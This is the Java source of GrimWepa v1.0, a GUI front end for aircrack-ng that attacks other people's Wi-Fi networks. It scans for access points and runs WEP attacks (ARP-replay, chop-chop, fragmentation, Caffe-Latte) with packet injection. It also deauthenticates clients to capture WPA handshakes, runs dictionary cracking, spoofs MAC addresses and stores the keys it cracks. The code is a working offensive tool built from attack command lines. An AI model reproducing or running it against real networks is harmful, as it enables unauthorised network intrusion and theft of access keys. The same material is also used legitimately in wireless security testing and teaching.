/**
 * GRIM WEPA
 * version 1.0
 * 
 * BY DERV
 * 
 * WRITTEN IN JAVA! (yay)
 * 
 * FILES:
 * 
 * test2.java          > this class.  contains main method.
 *                     > loads gui, handles events, and does the majority of the work.
 * 
 * *** All other classes implement Runnable -- so they can be multi-threaded ***
 *             without multithreading, the GUI would lock up 
 *             and the user would not be able to click "STOP"
 * 
 * targetClass.java    > implements Runnable (threaded).  Watches airodump-ng's output file
 * 					   > adds targets to list accordingly (and clients to lists as well).
 * scripter.java       > WPA attack! unoriginal filename, give me a break.
 *					   > Listens for handshake by passing captured CAP file through aircrack-ng
 * wpacracker.java     > watches for file 'wpacracked.txt' to appear in grimwepa's working directory.
 * injectionClass.java > tests access point for injection. it's own class so as to be multi-threaded.
 * wepattack1.java     > very busy class.  handles all possible WEP attacks, including the client-based
 *					   > as well as the Intel 4965 wpa_supplicant code, and mac-changing, etc... it's big.
 * wepcracker.java     > listens for 'wepcracked.txt' to appear in grimwepa's working directory.
 * 
 * Changes in v1.0:
 *  - Added Power column to list
 *  - Fixed Injection Test bug (as good as it's gonna get).
 *  - Add cracked keys to a file, including SSID and type.
 *  - Display previously-cracked keys based on SSID target click. Displays below list
 *  - HUGE BUG FIX : GrimWepa can now handle directories with spaces in them! :D
 *  - Hid "Change MAC" button, forced MAC Address change when doing client-based attack.
 *       - MAC changes back automatically. Thanks shamanvirtuel!
 * 
 * Copyright 2010 Derv Merkler
 * 
 */


// command to save as JAR file: (includes default pw list and readme files)
//    jar cvfm grimwepa_0.9.jar mymanifest *.class default_pw.txt README

// GUI and events, oh my!
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.table.*;
import javax.swing.event.*;
import javax.swing.SwingUtilities;
import javax.swing.filechooser.*;


// basic in out and utilities
import java.io.*;
import java.util.*;

// for URI exception crap (finding path to jar file)
import java.net.*;

// extracting default_pw.txt from jar file...
import java.util.jar.*;
import java.util.zip.*;

public class test2 extends Frame implements WindowListener, ActionListener, EventListener, ListSelectionListener {
	public static JCheckBox  hideWin;       // hide xterms checkbox
	
	// Drivers
	public static JLabel     iface;         // label that shows Wifi Device:
	public static JComboBox  drivers;       // combobox holding wifi drivers in monitor mode
	public static Button     buttonDrivers; // Refresh Drivers button
	
	// Targets list, refresh button, and timeout
	public JScrollPane       tscroll;         // scrollpane to keep list inside of
	public static JTable     targets;         // list of targets
	public static DefaultTableModel targetsm; // DTM for list (much easier to add/remove)
	
	// Channel slider
	public static JLabel     chlabel;  // label that says "channel"
	public static JCheckBox  chkchan;  // checkbox to use "all channels"
	public static JSlider    chslider; // channel slider (1-14)
	
	// Refresh & timeout components
	public static Button     buttonTargets; // "refresh targets" button
	public static JLabel     ltimeout;      // label showing refresh timeout
	public static JTextField timeout;       // textfield holding timeout
	
	// WEP panel
	public static JPanel     wepanel;     // panel holding all WEP-related attack components
	public static JLabel     weplattack;  // label for "Attack method"
	public static JComboBox  wepattack;   // WEP attacks combobox (frag, chopchop, etc)
	public static JCheckBox  chkclient;   // WEP choose client checkbox
	public static JComboBox  clients;     // WEP clients combobox
	public static Button     buttonStart; // Start Attack button
	public static JLabel     wepivs;      // # of IVs captured label
	public static Button     buttonCrack; // Start Cracking button
	public static Button     buttonTest;  // Test injection button
	public static Button     buttonMAC;   // Change MAC button
	public static JLabel     fillerLabel; // to replace change mac button!
	
	public static JSlider    inslider; // injection rate slider
	public static JLabel     inlabel; // label for injection rate
	
	// WPA panel
	public static JPanel     wpanel;       // panel holding all WPA-related attack components
	public static Button     wpacrack;     // Start Cracking button
	public static JTextField wpawordlist;  // path to wordlist textbox
	public static JCheckBox  wpachkclients;// "choose client" checkbox
	public static JComboBox  wpaclients;   // list of clients combobox
	public static Button     wpadeauth;    // start deauth & handshake capture button
	public static JLabel     wpaltimeout;  // label that shows the timeout
	public static JTextField wpatimeout;   // text holding timeout
	public static JLabel     wpalabel;     // another label... to fill up space!
	public static Button     wpawordbutt;  // button to choose wpa word list
	
	// Status bar
	public static JLabel     status;       // status bar (label)
	
	public static Process pro1 = null; // pro1 is used by targetClass.java
				// pro1 is the process runs airodump in the background
	
	public static Process procrack = null; // procrack is used by wpacracker.java
			// procrack is the process that runs aircrack-ng in the background
	
	public static Process prowep = null; // process used for airodump with wep cracker
	
	public static Process proinj = null; // process for injection test
	
	public static Process prointel = null; // process for the wpa_supplicant work-around
	public targetClass tc;  // thread to gather targets
	
	public static String currentBSSID;   // holds our current target's bssid
	public static String currentSSID;    // holds current target's ssid (AP name)
	public static String currentChannel; // channel the current target is on
	public static String grimwepaPath;   // path to grimwepa working directory (where the jar file is)
	
	// create new window!
	public static test2 myWindow = new test2("GRIM WEPA");
	
	public static String[] cracked = new String[]{""};
	
	public static void main(String[] args) {
		
		// set window size
		myWindow.setSize(450,432);
		
		// the next 3 lines are for positioning the window in the center of the screen...
		Dimension ss = Toolkit.getDefaultToolkit().getScreenSize();
		Dimension w = myWindow.getSize();
		myWindow.setLocation((int)Math.max(0, (ss.width - w.width ) / 2), Math.max(0, ss.height - w.height) /2);
		// show window
		myWindow.setVisible(true);
		
		// load previously-cracked SSID's into the array 'cracked'
		// to be searched through / retrieved when user clicks on SSID's already cracked!!! ZOMG
		BufferedReader input = null;
		String result = "", line;
		try {
			input =  new BufferedReader(new FileReader(test2.grimwepaPath + "pass.txt"));
			while (( line = input.readLine()) != null ) {
				line = line.replaceAll("WPA", "");
				line = line.replaceAll("WEP", "");
				line = line.replaceAll("B\\(SSID\\): ", "");
				line = line.replaceAll("KEY: ", "");
				line = line.replaceAll("\t", "");
				System.out.println(line);
				result += "" + line.trim() + "\n";
			}
			cracked = result.split("\n");
		} catch (FileNotFoundException fnfe) {
			// fnfe.printStackTrace();
			// don't throw filenotfoundexception! might not have pass.txt yet (first load, maybe?)
		} catch (IOException ioe) {
			ioe.printStackTrace();
		}
		
		// load drivers!
		driverCheck();
	}
	public static void driverCheck() {
		// checks if any drivers are in monitor mode
		// if not, it enumerates the wireless drivers and asks which one to put into monitor mode!
		
		if (drivers.getItemCount() == 1) {
			// no devices are in monitor mode, prompt!!!
			Process proDrv = null;
			BufferedReader res1 = null;
			try {
				// run airmon ng to get list of devices that can be in monitor mode...
				proDrv = Runtime.getRuntime().exec("airmon-ng");
				res1 = new BufferedReader(new InputStreamReader(proDrv.getInputStream()));
				proDrv.waitFor(); // wait for data
				
				String line, drvs = "", drvz[], drv = "";
				// the while loop goes through each line of the output from airmon-ng
				while ((line = res1.readLine()) != null) {
					if ((line.indexOf("Interface") < 0) && (line.equals("") == false)) {
						// line isn't blank or the table columns, so it must be an iface:
						drvs += "," + line.substring(0, line.indexOf("\t"));
					}
				}
				if (drvs.equals("") == false) {
					// we have drivers to prompt
					drvs = drvs.substring(1); // get rid of leading comma
					drvz = drvs.split(",");   // put list of devices into array
					
					// prompt user
					String choice = (String)JOptionPane.showInputDialog(null, 
					   "Select which wireless device you want to put into monitor mode:", 
					   "GRIM WEPA | Select device for Monitor Mode",
					   JOptionPane.INFORMATION_MESSAGE, null, drvz, drvz[0]);
					
					if (choice != null) {
						// if they didn't click cancel
						// put that device into monitor mode!
						stat("Putting device into monitor mode...");
						drivers.removeAllItems();
						drivers.addItem("WiFi Device:");
						proDrv = Runtime.getRuntime().exec("airmon-ng start " + choice);
						res1 = new BufferedReader(new InputStreamReader(proDrv.getInputStream()));
						proDrv.waitFor(); // wait for it to go
						while ((line = res1.readLine()) != null) {
							if (line.indexOf("monitor mode enabled") >= 0) {
								line.replaceAll("\t", "");
								stat(choice + ": " + line);
								if (line.indexOf("enabled on") >= 0) {
									choice = line.substring(line.indexOf(
									"enabled on") + 11, line.length() - 1);
								}
							} else if ((line.indexOf("Interface") < 0) 
								  && (line.indexOf("\t") >= 0)) {
								// add driver to list
								drv = line.substring(0, line.indexOf("\t"));
								if (isValidDriver(drv) == true)
									drivers.addItem(drv);
							}
						}
						// addDriversToList();
						int tempi = -1;
						for (tempi = 0; tempi < drivers.getItemCount(); tempi++) {
							if (choice.equals((String)drivers.getItemAt(tempi)) == true) {
								tempi = -1;
								break;
							}
						}
						if (tempi != -1) 
							drivers.addItem(choice);
						drivers.setSelectedItem(choice);		
					}
				}
			} catch (IOException ioe) {
				ioe.printStackTrace();
			} catch (InterruptedException iex) {
				iex.printStackTrace();
			}
		}
	}
	public test2(String title) {
		// this constructor builds the GUI.
		
		// since we are extending Frame, we call the super!
		super(title);
		setResizable(false); // no need to resize
		
		// set working directory path
		// *POINTS TO WHERE JAR FILE IS LOCATED*
		grimwepaPath = "";
		try {
			File f = new File (test2.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			grimwepaPath = f.getPath();
			f = null;
		} catch (URISyntaxException use) {
			use.printStackTrace();
		}
		grimwepaPath = grimwepaPath.substring(0, grimwepaPath.lastIndexOf("/"));
		if (grimwepaPath.equals("") == false) {
			if (grimwepaPath.substring(grimwepaPath.length() - 1, grimwepaPath.length()).equals("/") == false)
				grimwepaPath = grimwepaPath + "/";
		}
		
		Font f = new Font("Default", Font.BOLD, 11); // we will use this a lot 
		
		// interface & drivers components
		super.setBackground(Color.black);
		super.setForeground(Color.green);
		setLayout(new FlowLayout());
		addWindowListener(this);
		
		iface = new JLabel("Interface:");
		iface.setPreferredSize(new Dimension(65, 18));
		iface.setForeground(Color.green);
		add(iface);
		
		drivers  = new JComboBox();
		drivers.setBackground(Color.black);
		drivers.setForeground(Color.green);
		add(drivers);
		drivers.addActionListener(this);
		
		try {
			addDriversToList(); // add drivers on load
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		buttonDrivers = new Button("Refresh drivers");
		buttonDrivers.setFont(f);
		add(buttonDrivers);
		buttonDrivers.addActionListener(this);
		
		doLayout();
		
		// Targets list commands
		targetsm = new DefaultTableModel(null, new String[] 
							{"Pwr","Network Name","Channel","Enc","BSSID"});
		
		targets = new JTable(targetsm) { 
					public boolean isCellEditable(int rowIndex, int vColIndex) { 
						return false; 
					} };
		
		targets.setBackground(Color.black);
		targets.setForeground(Color.green);
		targets.setPreferredScrollableViewportSize(new Dimension(420,100));
		targets.setFillsViewportHeight(true);
		
		targets.getColumnModel().getColumn(0).setPreferredWidth(20);   // power
		targets.getColumnModel().getColumn(1).setPreferredWidth(100);  // SSID
		targets.getColumnModel().getColumn(2).setPreferredWidth(25);   // channel
		// targets.getColumnModel().getColumn(2).setPreferredWidth(50);
		targets.getColumnModel().getColumn(3).setPreferredWidth(30);   // encryption
		targets.getColumnModel().getColumn(4).setPreferredWidth(85);   // BSSID
		targets.setFont(f);
		
		targets.getSelectionModel().addListSelectionListener(this);
		
		tscroll = new JScrollPane(targets);
		add(tscroll);
		
		targets.doLayout();
		
		// Channel slider & options
		chlabel = new JLabel("Channel:");
		chlabel.setForeground(Color.green);
		add(chlabel);
		
		chslider = new JSlider(0, 1, 14, 6);
		chslider.setBackground(Color.black);
		chslider.setForeground(Color.green);
		chslider.setMajorTickSpacing(1);
		chslider.setMinorTickSpacing(1);
		chslider.setPaintTicks(true);
		chslider.setPaintLabels(true);
		chslider.setPaintTrack(false);
		chslider.setSnapToTicks(true);
		chslider.setFont(new Font("Serif", Font.BOLD, 10));
		chslider.setPreferredSize(new Dimension(250, 35));
		// chslider.setBorder(BorderFactory.createLineBorder(Color.green));
		add(chslider);
		
		chkchan = new JCheckBox("All Channels");
		chkchan.setBackground(Color.black);
		chkchan.setForeground(Color.green);
		add(chkchan);
		chkchan.addActionListener(this);
		
		
		hideWin = new JCheckBox("Hide XTerms");
		hideWin.setForeground(Color.green);
		hideWin.setBackground(Color.black);
		hideWin.setPreferredSize(new Dimension(135,18));
		add(hideWin);
		
		// Refresh button & timeout
		buttonTargets = new Button("Refresh Targets");
		buttonTargets.setFont(f);
		add(buttonTargets);
		buttonTargets.addActionListener(this);
		
		ltimeout = new JLabel("Timeout (sec):");
		ltimeout.setPreferredSize(new Dimension(90, 18));
		ltimeout.setForeground(Color.green);
		add(ltimeout);
		timeout = new JTextField("5");
		timeout.setPreferredSize(new Dimension(30, 20));
		timeout.setHorizontalAlignment(JTextField.CENTER);
		timeout.setBackground(Color.black);
		timeout.setForeground(Color.green);
		add(timeout);
		
		// WEP PANEL
		wepanel = new JPanel();
		wepanel.setPreferredSize(new Dimension(430,155));
		
		weplattack = new JLabel("Attack method:");
		weplattack.setForeground(Color.green);
		wepanel.add(weplattack);
		
		wepattack = new JComboBox();
		
		wepattack.addItem("Select attack:"); // 0
		wepattack.addItem("ARP-Replay");        // 1
		wepattack.addItem("Chop-Chop");         // 2
		wepattack.addItem("Fragmentation");     // 3
		wepattack.addItem("Caffe-Latte");       // 4
		wepattack.addItem("p0841 Attack");      // 5
		// wepattack.setPreferredSize(new Dimension(200, 20));
		wepattack.setBackground(Color.black);
		wepattack.setForeground(Color.green);
		wepanel.add(wepattack);
		wepattack.addActionListener(this);
		
		buttonTest = new Button("Test Injection");
		buttonTest.setFont(f);
		wepanel.add(buttonTest);
		buttonTest.addActionListener(this);
		
		inlabel = new JLabel("Injection rate (pps):");
		inlabel.setBackground(Color.black);
		inlabel.setForeground(Color.green);
		wepanel.add(inlabel);
		
		inslider = new JSlider(0, 100, 1000, 600);
		inslider.setBackground(Color.black);
		inslider.setForeground(Color.green);
		inslider.setMajorTickSpacing(100);
		inslider.setMinorTickSpacing(100);
		inslider.setPaintTicks(true);
		inslider.setPaintLabels(true);
		inslider.setPaintTrack(false);
		inslider.setSnapToTicks(true);
		inslider.setFont(new Font("Serif", Font.BOLD, 10));
		inslider.setPreferredSize(new Dimension(250, 35));
		// chslider.setBorder(BorderFactory.createLineBorder(Color.green));
		wepanel.add(inslider);
		
		chkclient = new JCheckBox("Choose client:", false);
		// chkclient.setPreferredSize(new Dimension(200, 18));
		chkclient.setBackground(Color.black);
		chkclient.setForeground(Color.green);
		wepanel.add(chkclient);
		chkclient.addActionListener(this);
		
		clients = new JComboBox();
		clients.setBackground(Color.black);
		clients.setForeground(Color.green);
		clients.addItem("[no clients found]");
		clients.setPreferredSize(new Dimension(150, 20));
		clients.setEnabled(false);
		wepanel.add(clients);
		
		/*buttonMAC = new Button("Change MAC");
		buttonMAC.setFont(f);
		wepanel.add(buttonMAC);
		buttonMAC.addActionListener(this);*/
		fillerLabel = new JLabel("");
		fillerLabel.setPreferredSize(new Dimension(50, 18));
		fillerLabel.setFont(f);
		wepanel.add(fillerLabel);	
		
		buttonStart = new Button("Start Attack");
		buttonStart.setFont(f);
		buttonStart.setPreferredSize(new Dimension(100, 20));
		wepanel.add(buttonStart);
		buttonStart.addActionListener(this);
		
		wepivs = new JLabel("IVs Captured: 0");
		wepivs.setPreferredSize(new Dimension(150, 18));
		wepivs.setForeground(Color.green);
		wepanel.add(wepivs);
		
		buttonCrack = new Button("Start Cracking");
		buttonCrack.setFont(f);
		wepanel.add(buttonCrack);
		wepanel.setBackground(Color.black);
		wepanel.setForeground(Color.green);
		buttonCrack.addActionListener(this);
		wepanel.setForeground(Color.green);
		wepanel.setBorder(BorderFactory.createTitledBorder(null, "WEP", 0, 0, null, Color.gray));
		add(wepanel);
		
		// wepanel.setVisible(false);
		// END OF WEP PANEL
		
		// WPA PANEL
		wpanel = new JPanel();
		wpanel.setPreferredSize(new Dimension(430, 155));
		wpanel.setBackground(Color.black);
		wpanel.setForeground(Color.green);
		wpanel.setBorder(BorderFactory.createTitledBorder(null, "WPA", 0, 0, null, Color.green));
		
		wpachkclients = new JCheckBox("Use client in attack:");
		wpachkclients.setBackground(Color.black);
		wpachkclients.setForeground(Color.green);
		wpanel.add(wpachkclients);
		wpachkclients.addActionListener(this);
		
		wpaclients = new JComboBox();
		wpaclients.addItem("[no clients found]");
		wpaclients.setPreferredSize(new Dimension(150, 20));
		wpaclients.setBackground(Color.black);
		wpaclients.setForeground(Color.green);
		wpaclients.setEnabled(false);
		wpanel.add(wpaclients, BorderLayout.CENTER);
		
		wpadeauth = new Button("Start Deauth + Handshake Capture Attack");
		wpanel.add(wpadeauth);
		wpadeauth.addActionListener(this);
		
		wpaltimeout = new JLabel("Timeout (sec):");
		wpaltimeout.setForeground(Color.green);
		wpanel.add(wpaltimeout);
		
		wpatimeout = new JTextField("5");
		wpatimeout.setHorizontalAlignment(JTextField.CENTER);
		wpatimeout.setPreferredSize(new Dimension(30, 20));
		wpatimeout.setForeground(Color.green);
		wpatimeout.setBackground(Color.black);
		wpanel.add(wpatimeout);
		
		wpalabel = new JLabel("[Cracking is only accessible AFTER a handshake is captured]");
		wpatimeout.setHorizontalAlignment(JLabel.CENTER);
		wpalabel.setPreferredSize(new Dimension(390, 30));
		wpalabel.setForeground(Color.green);
		wpalabel.setBackground(Color.black);
		wpanel.add(wpalabel);
		
		wpacrack = new Button("Crack WPA (Dictionary Attack)");
		wpanel.add(wpacrack);
		wpacrack.addActionListener(this);
		wpacrack.setEnabled(false);
		
		wpawordlist = new JTextField("[default wordlist]");
		wpawordlist.setForeground(Color.green);
		wpawordlist.setBackground(Color.black);
		wpawordlist.setPreferredSize(new Dimension(180, 20));
		wpanel.add(wpawordlist);
		wpawordlist.setEnabled(false);
		
		wpawordbutt = new Button("...");
		wpanel.add(wpawordbutt);
		wpawordbutt.addActionListener(this);
		wpawordbutt.setEnabled(false);
		
		add(wpanel);
		doLayout();
		
		wpanel.setVisible(false);
		// END OF WPA PANEL
		
		status = new JLabel(" Status: [inactive]");
		status.setForeground(Color.green);
		status.setBorder(BorderFactory.createLineBorder(Color.green));
		status.setPreferredSize(new Dimension(430, 20));
		add(status);
		
		// add listener for targets table
		/*targets.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent e) {
				// do nothing!
			}
		} );
		*/
		doLayout();
		
		wepanel.setEnabled(false);
		weplattack.setEnabled(false);
		wepattack.setEnabled(false);
		chkclient.setEnabled(false);
		clients.setEnabled(false);
		buttonStart.setEnabled(false);
		wepivs.setEnabled(false);
		buttonCrack.setEnabled(false);
		buttonTest.setEnabled(false);
		// buttonMAC.setEnabled(false);
		inlabel.setEnabled(false);
		inslider.setEnabled(false);
		
		loadSettings();
	} // end of GUI building
	
	public void loadSettings() {
		// loads preferences from /etc/grimwepa.conf
		boolean showreadme = true;
		BufferedReader input = null;
		try {
			input =  new BufferedReader(new FileReader("/etc/grimwepa.conf"));
			String line = null;
			while (( line = input.readLine()) != null ) {
				if (line.length() >= 5) {
					if (line.substring(0, 5).equals("iface") == true) {
						String iface = line.substring(6);
						for (int i = 0; i < drivers.getItemCount(); i++) {
							if (iface.equals(drivers.getItemAt(i)) == true) {
								drivers.setSelectedIndex(i);
								break;
							}
						}
					} else if (line.substring(0, 5).equals("chann") == true) {
						chslider.setValue(Integer.parseInt(line.substring(8)));
					} else if (line.substring(0, 5).equals("allch") == true) {
						if (line.substring(8).equals("true") == true) {
							chkchan.setSelected(true);
							chslider.setEnabled(false);
						}
					} else if (line.substring(0, 5).equals("targe") == true) {
						timeout.setText(line.substring(14));
					} else if (line.substring(0, 5).equals("wpati") == true) {
						wpatimeout.setText(line.substring(11));
					} else if (line.substring(0, 5).equals("wepat") == true) {
						int wepind = Integer.parseInt(line.substring(10));
						wepattack.setSelectedIndex(wepind);
					} else if (line.substring(0, 5).equals("wpawo") == true) {
						wpawordlist.setText(line.substring(8));
					} else if (line.substring(0, 5).equals("shown") == true) {
						showreadme = false;
					} else if (line.substring(0, 5).equals("xterm") == true) {
						if (line.substring(6).equals("true") == true)
							hideWin.setSelected(true);
					} else if (line.substring(0, 5).equals("irate") == true) {
						try {
							inslider.setValue(Integer.parseInt(line.substring(6)));
						} catch (NumberFormatException nfe) {
							nfe.printStackTrace();
						}
					}
				}
			}
		} catch (IOException ioe) {
			ioe.printStackTrace();
		} finally {
			try {
				input.close();
			} catch (IOException ioe) {
				ioe.printStackTrace();
			} catch (NullPointerException npe) {
				npe.printStackTrace();
			}
		}
		// if this is the first time loading the configuration...
		if (showreadme == true) {
			// put the README and grimstall.sh in the working directory
			generateReadme();
			generateInstall();
		}
	}
	public void saveSettings() {
		// saves preferences to /etc/grimwepa.conf
		Writer output = null;
		try {
			output = new BufferedWriter(new FileWriter("/etc/grimwepa.conf"));
			output.write("iface " + (String)drivers.getItemAt(drivers.getSelectedIndex()));
			output.write("\nchannel " + chslider.getValue());
			output.write("\nallchan " + chkchan.isSelected());
			output.write("\ntargettimeout " + timeout.getText());
			output.write("\nwpatimeout " + wpatimeout.getText());
			output.write("\nwepattack " + wepattack.getSelectedIndex());
			output.write("\nwpaword " + wpawordlist.getText());
			output.write("\nxterm " + hideWin.isSelected());
			output.write("\nirate " + inslider.getValue());
			output.write("\nshown"); // only display the README once!
		} catch (FileNotFoundException fnfe) {
			fnfe.printStackTrace();
		} catch (IOException ioe) {
			ioe.printStackTrace();
		} finally {
			try {
				output.close();
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
		}
	}
	
	public void valueChanged(ListSelectionEvent e) {
		// item selection in the targets list has changed
		int row = targets.getSelectedRow();
		if (row != -1) {
			String temp;
			temp = (String)targets.getValueAt(row, 3);
			if (temp.indexOf("WEP") >= 0) {
				// they clicked an AP that is WEP
				wpanel.setVisible(false);
				wepanel.setVisible(true);
				
				wepanel.setEnabled(true);
				wepattack.setEnabled(true);
				weplattack.setEnabled(true);
				chkclient.setEnabled(true);
				if (chkclient.isSelected() == true) {
					clients.setEnabled(true);
					// buttonMAC.setEnabled(true);
				}
				buttonStart.setEnabled(true);
				wepivs.setEnabled(true);
				buttonCrack.setEnabled(true);
				buttonTest.setEnabled(true);
				inslider.setEnabled(true);
				inlabel.setEnabled(true);
				
				currentBSSID = (String)targets.getValueAt(row, 4);
				currentSSID = (String)targets.getValueAt(row, 1);
				currentSSID = currentSSID.trim();
				currentChannel = (String)targets.getValueAt(row, 2);
				while (currentChannel.substring(0, 1).equals(" ") == true) {
					currentChannel = currentChannel.substring(1);
				}
				
				String key = "";
				for (int i = 0; i < cracked.length; i++) {
					if (cracked[i].indexOf(currentBSSID + "(" + currentSSID + ")") >= 0) {
						key = " Key: " + cracked[i].substring(currentBSSID.length() + currentSSID.length() + 2);
						break;
					}
				}
				
				wepanel.setBorder(BorderFactory.createTitledBorder(
					null, "WEP | Targeting '" + (String)targets.getValueAt(row,4) + "'" + key, 
					0, 0, null, Color.green));
			} else if (temp.indexOf("WPA") >= 0) {
				// they clicked an AP that is WPA
				wepanel.setVisible(false);
				wpanel.setVisible(true);
				
				currentBSSID = (String)targets.getValueAt(row,4);
				currentSSID = (String)targets.getValueAt(row, 1);
				currentSSID = currentSSID.trim();
				currentChannel = (String)targets.getValueAt(row, 2);
				while (currentChannel.substring(0, 1).equals(" ") == true) {
					currentChannel = currentChannel.substring(1);
				}
				
				String key = "";
				for (int i = 0; i < cracked.length; i++) {
					if (cracked[i].indexOf("[" + currentSSID + "]") >= 0) {
						key = " Key: " + cracked[i].substring(currentSSID.length() + 2);
						break;
					}
				}
				wpanel.setBorder(BorderFactory.createTitledBorder(
					null, "WPA | Targeting '" + (String)targets.getValueAt(row,4) + "'" + key, 
					0, 0, null, Color.green));
				
			}
		} else {
			wpanel.setVisible(false);
			wepanel.setVisible(true);
			wepanel.setEnabled(false);
			wepanel.setBorder(BorderFactory.createTitledBorder(
					null, "WEP", 
					0, 0, null, Color.gray));
			wepattack.setEnabled(false);
			weplattack.setEnabled(false);
			chkclient.setEnabled(false);
			clients.setEnabled(false);
			buttonStart.setEnabled(false);
			wepivs.setEnabled(false);
			buttonCrack.setEnabled(false);
			buttonTest.setEnabled(false);
			// buttonMAC.setEnabled(false);
			inslider.setEnabled(false);
			inlabel.setEnabled(false);
			currentBSSID = null;
			currentChannel = "";
		}
		// make it pretty
		test2.super.doLayout();
	}
	public void actionPerformed(ActionEvent event) {
		// a button was clicked!!!
		
		if (event.getSource() == buttonDrivers) {
			// refresh drivers button
			setEnable(false);
			try {
				addDriversToList();
			} catch (IOException err) {
				err.printStackTrace();
			}
			setEnable(true);
		} else if ((event.getSource() == buttonTargets)) {
			// refresh targets button
			if (buttonTargets.getLabel().equals("Refresh Targets") == true) {
				String drv = (String)drivers.getItemAt(drivers.getSelectedIndex());
				if (drv.equals("WiFi Device:") == false) {
					addTargetsToList();
				} else
					JOptionPane.showMessageDialog(null, "Select a WiFi interface!\n" +
						"You may need to put your network card into Monitor Mode\n" +
						"i.e. airmon-ng start wlan0");
			} else {
				buttonTargets.setLabel("Refresh Targets");
				test2.setEnable(true);
			}
		} else if (event.getSource() == wepattack) {
			// combobox click / change
			
		} else if (event.getSource() == chkclient) {
			// WEP clients checkbox
			clients.setEnabled(chkclient.isSelected());
			// buttonMAC.setEnabled(chkclient.isSelected());
		} else if (event.getSource() == chkchan) {
			// channel checkbox
			chslider.setEnabled(!chkchan.isSelected());
		} else if (event.getSource() == wpachkclients) {
			// wpa clients checkbox
			wpaclients.setEnabled(wpachkclients.isSelected());
		} else if (event.getSource() == wpadeauth) {
			// wpa attack
			wpaAttack();
		} else if (event.getSource() == wpacrack) {
			// wpa crack
			wpaCrack();
		} else if (event.getSource() == buttonStart) {
			// wep attack
			wepAttack();
		} else if (event.getSource() == buttonCrack) {
			// wep crack
			wepCrack();
		} else if (event.getSource() == buttonTest) {
			// test injection
			testInjection();
		// } else if (event.getSource() == buttonMAC) {
			// change mac address
			// changeMAC();
		} else if (event.getSource() == wpawordbutt) {
			// select wordlist file
			selectWordlist();
		}
	}
	
	public static void selectWordlist() {
		JFileChooser fc = new JFileChooser();
		fc.setCurrentDirectory(new File(wpawordlist.getText()));
		int retval = fc.showOpenDialog(null);
		if (retval == JFileChooser.APPROVE_OPTION) {
			File f = fc.getSelectedFile();
			wpawordlist.setText(f.getPath());
		}
	}
	
	
	public static void testInjection() {
		// tests injection, stops if it's already testing
		if (buttonTest.getLabel().equals("Test Injection") == true) {
			buttonTest.setLabel("Stop Inj. Test");
			try {
				// have to use airodump to set it on the right channel!
				String xterm;
				if (hideWin.isSelected() == false)
					xterm = "xterm -fg green -bg black -geom 100x15+0+450 -e ";
				else
					xterm = "";
				proinj = Runtime.getRuntime().exec(xterm + "airodump-ng -c " + currentChannel + " " + (String)drivers.getItemAt(drivers.getSelectedIndex()));
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
			
			injectionClass injt = new injectionClass();
			injt.t.start();
		} else {
			// buttonCrack.setLabel("Start Cracking");
			injectionClass.flag = true;
			proinj.destroy();
		}
	}
	public static void setEnable(boolean en) {
		// Enable or disable [almost] all components depending on 'en'
		
		// Drivers list
		drivers.setEnabled(en);
		buttonDrivers.setEnabled(en);
		
		// Targets list
		targets.setEnabled(en);
		
		// Refresh button & channels
		buttonTargets.setEnabled(en);
		chkchan.setEnabled(en);
		chslider.setEnabled(en);
		if (en == true && chkchan.isSelected() == true)
			chslider.setEnabled(false);
		
		// WEP panel
		if (currentBSSID != null) {
			wepanel.setEnabled(en);
			wepattack.setEnabled(en); // combobox
			chkclient.setEnabled(en); // check
			clients.setEnabled(en);   // combo
			if (en == true && chkclient.isSelected() == false) {
				clients.setEnabled(false);
				// buttonMAC.setEnabled(false);
			}
			buttonStart.setEnabled(en);
			buttonCrack.setEnabled(en);
			weplattack.setEnabled(en);
			wepivs.setEnabled(en);
			buttonTest.setEnabled(en);
			inslider.setEnabled(en);
			inlabel.setEnabled(en);
		}
		// WPA panel
		wpanel.setEnabled(en);
		// wpacrack.setEnabled(en);
		wpawordlist.setEnabled(en);   //textbox
		wpawordbutt.setEnabled(en);   // browse icon
		wpachkclients.setEnabled(en); //check
		wpaclients.setEnabled(en);    //combo
		if (en == true && wpachkclients.isSelected() == false)
			wpaclients.setEnabled(false);
		wpadeauth.setEnabled(en);     //button
		wpatimeout.setEnabled(en);    //text
		
		iface.setEnabled(en);
		chlabel.setEnabled(en);
		ltimeout.setEnabled(en);
		wpaltimeout.setEnabled(en);
		timeout.setEnabled(en);
	}
	
	public static void wepCrack() {
		// assuming ivs file is wep-01.ivs
		if (buttonCrack.getLabel().equals("Start Cracking") == true) {
			buttonCrack.setLabel("Stop Cracking");
			try {
				String[] blah = fixArgumentsPath("rm -rf !PATH!wepcracked.txt");
				procrack = Runtime.getRuntime().exec(blah);
				procrack.waitFor();
				procrack.destroy();
				
				stat("Cracking WEP...");
				String xterm;
				if (hideWin.isSelected() == true)
					xterm = "";
				else
					xterm = "xterm -fg green -bg black -geom 100x15+0+450 -iconic -e ";
				xterm += "aircrack-ng -a 1 -b " + currentBSSID + " " + "-l !PATH!wepcracked.txt !PATH!wep-01.ivs";
				procrack = Runtime.getRuntime().exec(fixArgumentsPath(xterm));
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException ie) {
				ie.printStackTrace();
			}
			
			wepcracker wepc = new wepcracker();
			wepc.t.start();
		} else {
			// buttonCrack.setLabel("Start Cracking");
			wepcracker.flag = true;
		}
	}
	public void wepAttack() {
		if (buttonStart.getLabel().equals("Start Attack") == true) {
			// start the attack
			setEnable(false);
			buttonStart.setEnabled(true);
			buttonCrack.setEnabled(true);
			
			wepattack1 wa1 = new wepattack1();
			wa1.t.start();
			
			// capture!
			buttonStart.setLabel("Stop Attack");
			try {
				pro1 = Runtime.getRuntime().exec(fixArgumentsPath("rm -rf !PATH!wep-01.ivs"));
				pro1.waitFor();
				pro1.destroy();
				
				pro1 = Runtime.getRuntime().exec(fixArgumentsPath("rm -rf !PATH!wep-01.csv"));
				pro1.waitFor();
				pro1.destroy();
				
				String drv = (String)drivers.getItemAt(drivers.getSelectedIndex());
				String xterm;
				//if (hideWin.isSelected() == true)
				//	xterm = "";
				//else
					xterm = "xterm -fg green -bg black -geom 100x15+0+0 -iconic -e ";
				// CAN'T HIDE XTERM WHEN GATHERING IVS : CSV ISN'T UPDATED!!!
